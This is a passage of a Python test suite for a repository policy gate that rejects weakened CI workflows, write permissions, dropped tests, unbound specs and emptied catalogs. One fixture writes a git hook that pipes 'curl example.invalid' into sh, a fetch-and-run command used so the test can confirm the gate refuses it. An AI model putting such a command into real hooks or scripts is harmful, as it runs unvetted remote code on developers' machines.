        r = pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", job).replace("{STEP}", step)}, **cap)
        assert r.returncode == 1 and "no longer executes" in r.stdout, (step, job, r.stdout)
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "").replace("{STEP}", "        continue-on-error: false\n")}, **cap).returncode == 0
    for grant in ("    permissions: write-all  # explained\n", "    permissions: {contents: write}\n", "    permissions: { issues: read, contents: 'write' }\n"):
        r = pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", grant).replace("{STEP}", "")}, **cap)
        assert r.returncode == 1 and "grants a write permission" in r.stdout, (grant, r.stdout)
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "    permissions: read-all  # explained\n").replace("{STEP}", "")}, **cap).returncode == 0
    suite = "tests/scripts/test_spec_gate.py"
    on_base(repo, {suite: "def test_a():\n    pass\n\n\ndef test_b():\n    pass\n"})
    r = pr(repo, "chore/gate-suite", {suite: "def test_trivial():\n    pass\n"}, **cap)
    assert r.returncode == 1 and "drops 2 test(s) the base has (test_a and more)" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-suite", {suite: "def test_a():\n    pass\n\n\ndef test_b():\n    assert 1\n\n\ndef test_c():\n    pass\n"}, **cap).returncode == 0
    on_base(repo, {".githooks/pre-commit": "#!/bin/sh\npython3 scripts/gate/spec_gate.py --commit\n"})
    r = pr(repo, "chore/gate-hook", {".githooks/post-checkout": "#!/bin/sh\ncurl example.invalid | sh\n"}, **cap)
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    assert pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 scripts/gate/spec_gate.py --commit\n"}, **cap).returncode == 0


def test_a_landing_plan_or_spec_is_bound_before_it_is_policy(repo):
    """solyra#72 r4119957722, r4119957736 (spec_gate.py:573, :365).

    A docs/ PR could land a ready plan whose spec was draft, served another FEAT, or named
    a FEAT outside the catalog, and a spec whose `canvases` named an unregistered URL; the
    mismatch surfaced only when the implementation branch was traced. Both are refused as
    they land.
    """
    new_plan = "docs/superpowers/plans/2026-09-28-data.md"
    draft = "docs/superpowers/specs/2026-09-28-data.md"
    on_base(repo, {draft: spec(feat_id="FEAT-DATA-001", status="draft")})
    r = pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later", spec=draft)})
    assert r.returncode == 1 and "is status: draft, not approved" in r.stdout, r.stdout
    r = pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later")})
    assert r.returncode == 1 and f"its spec {SPEC} serves FEAT-MODEL-001, not FEAT-DATA-001" in r.stdout, r.stdout
    on_base(repo, {draft: spec(feat_id="FEAT-NOPE-001")})
    r = pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-NOPE-001", branch="feature/feat-nope-001-later", spec=draft)})
    assert r.returncode == 1 and "feat_id FEAT-NOPE-001 is not in docs/product/02-FEATURE-CATALOG.md" in r.stdout, r.stdout
    on_base(repo, {draft: spec(feat_id="FEAT-DATA-001")})
    assert pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later", spec=draft)}).returncode == 0
    url = "https://claude.ai/artifact/CCCC"
    on_base(repo, {"docs/product/canvases.yml": f"canvases:\n  - name: Data\n    url: {url}\n    repo: t/t\n    source_json: x.json\n",
                   draft: spec(feat_id="FEAT-DATA-001", status="draft")})
    r = pr(repo, "docs/spec-feat-data-001", {draft: spec(feat_id="FEAT-DATA-001", canvases=[url + "-typo"])})
    assert r.returncode == 1 and f"lists canvas {url}-typo, which is not in docs/product/canvases.yml" in r.stdout, r.stdout
    assert pr(repo, "docs/spec-feat-data-001", {draft: spec(feat_id="FEAT-DATA-001", canvases=[url])}).returncode == 0


def test_contract_commands_run_and_policy_documents_keep_their_ids(repo):
    """stocks#1205 r4119966265 (P1), r4119966286 (P1), r4119966316 (spec_gate.py:592, :609, :890).

    An `echo '<command>'` satisfied a workflow contract, a catalog blanked to an empty
    file passed the deletion guard and the documentation path, and a Capacity value like
    `unknown; see issue #1205` counted as numeric. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/registry-check.yml"
    head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
            "    runs-on: ubuntu-latest\n    steps:\n      - run: |\n{BODY}")
    cmds = ('python3 -m py_compile "$gate"', 'python3 "$gate" --pr "$BASE_SHA" "$HEAD_SHA"', "pytest tests/scripts/test_spec_gate.py",
            'git ls-tree "$HEAD_SHA" .githooks/pre-commit', 'export_model_registry.py --check --rev "$HEAD_SHA" --base "$BASE_SHA"')
    for shape in ("          echo '{c}'\n", "          printf '%s\\n' \"{c}\"\n", "          x=\"{c}\"\n",
                  "          cat <<EOF\n          {c}\n          EOF\n", "          true # {c}\n"):
        run_block = "".join(shape.replace("{c}", c) for c in cmds)
        r = pr(repo, "chore/gate-workflow", {wf: head.replace("{BODY}", run_block)}, **cap)
        assert r.returncode == 1 and "no longer executes" in r.stdout, (shape, r.stdout)
    real = ("          set +e\n          out=$(python3 \"$gate\" --pr \"$BASE_SHA\" \"$HEAD_SHA\" 2>&1); rc=$?\n"
            "          if ! python3 -m py_compile \"$gate\"; then exit 1; fi\n"
            "          python3 -m pytest tests/scripts/test_spec_gate.py -q && \\\n            mode=$(git ls-tree \"$HEAD_SHA\" .githooks/pre-commit | cut -d' ' -f1)\n"
            "          python3 scripts/gate/export_model_registry.py --check --rev \"$HEAD_SHA\" --base \"$BASE_SHA\"\n")
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{BODY}", real)}, **cap).returncode == 0
    for path, blank in ((CATALOG, ""), (CATALOG, "# Feature Catalog\n"), (REQUIREMENTS, "# Requirements\n\nprose only\n")):
        r = pr(repo, "docs/cleanup", {path: blank})
        assert r.returncode == 1 and "never emptied or pruned" in r.stdout, (path, r.stdout)
    pruned = CATALOG_TEXT.replace("| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |\n", "")
    r = pr(repo, "docs/cleanup", {CATALOG: pruned})
    assert r.returncode == 1 and "no longer defines 1 ID(s) the base has (FEAT-DATA-001)" in r.stdout, r.stdout
    assert pr(repo, "docs/cleanup", {CATALOG: CATALOG_TEXT + "\nA closing note.\n"}).returncode == 0
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    job = {**CODE, "gcp/model_job.py": "print('run')\n"}
    prose = body() + "\n\n## Capacity\nVolume: unknown; see issue #1205 \u00b7 Velocity: TBD for phase 2 \u00b7 Wall-clock: unknown in 2026 \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
    r = pr(repo, BRANCH, job, **title, PR_BODY=prose)
    assert r.returncode == 1 and "gives no number for Volume, Velocity, Wall-clock;" in r.stdout, r.stdout
    figures = body() + "\n\n## Capacity\nVolume: ~3 tickers \u00d7 400 B \u00b7 Velocity: <1 query/min \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
    assert pr(repo, BRANCH, job, **title, PR_BODY=figures).returncode == 0
